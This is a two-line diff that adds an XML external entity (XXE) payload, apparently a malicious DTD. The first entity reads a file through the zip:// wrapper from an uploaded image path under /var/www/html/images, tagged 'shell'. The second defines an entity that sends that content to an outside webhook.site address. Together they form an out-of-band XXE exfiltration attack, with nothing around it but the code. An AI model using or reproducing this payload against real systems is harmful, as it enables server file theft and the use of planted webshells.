@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "zip:///var/www/html/images/2futhqhipfdkepblkoide7t0e5/3200f5262bd91d1bdd748aa8bf482e52e68de08c.jpg%23shell">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://webhook.site/7c4ba838-9cfb-497f-893c-076d4fc81727/?%data;'>">
